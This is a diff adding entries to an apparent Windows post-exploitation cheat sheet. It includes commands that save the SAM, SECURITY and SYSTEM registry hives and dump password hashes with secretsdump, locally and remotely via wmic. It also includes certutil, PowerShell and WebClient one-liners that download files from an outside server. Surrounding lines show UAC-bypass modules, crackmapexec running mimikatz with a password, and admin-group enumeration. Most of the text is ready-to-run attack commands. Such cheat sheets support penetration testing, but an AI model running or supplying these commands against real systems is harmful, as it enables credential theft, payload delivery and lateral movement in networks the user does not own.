@@ -62,6 +62,18 @@ whoami /all
 taskkill /f /pid 7236  
 taskkill /f /im "Taskmgr.exe"  
 
+## Dump password from SAM file with registry
+reg.exe save hklm\sam c:\temp\sam.save  
+reg.exe save hklm\security c:\temp\security.save  
+reg.exe save hklm\system c:\temp\system.save  
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL  
+#https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py  
+#Do this remotely
+wmic /node:"<computer_name>" /user:"<username>" /password:"<password>" process call create "cmd.exe /c reg save hklm\sam C:\temp\sam.save"  
+
+## List online user
+qwinsta  
+
 ## Bypass UAC & Privilege Escalation
 use exploit/windows/local/bypassuac  
 use exploit/windows/local/bypassuac_eventvwr  
@@ -168,6 +180,10 @@ winrm quickconfig
 ## crackmapexec
 proxychains crackmapexec 192.168.255.10 -u john -p 'P@ssw0rd' -M mimikatz -o COMMAND=privilege::debug
 
+## Download file
+Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename"  
+(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename")  
+certutil.exe -urlcache -split -f https://myserver/filename outputfilename  
 
 # On AD
 powershell "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()"  
@@ -177,9 +193,12 @@ powershell "get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,Se
 ## Find admin group
 powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '\*admin\*'}"  
 
+
+
 # Resource::
 - https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf  
 - https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure  
 - https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain  
 - https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet  
 - https://www.slideshare.net/chrisgates/adversarial-simulation-nickersongates-wild-west-hacking-fest-oct-2017-81444587?qid=f71aedc6-c352-4154-bc51-3faefd5fc0ac&v=&b=&from_search=1
+- http://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
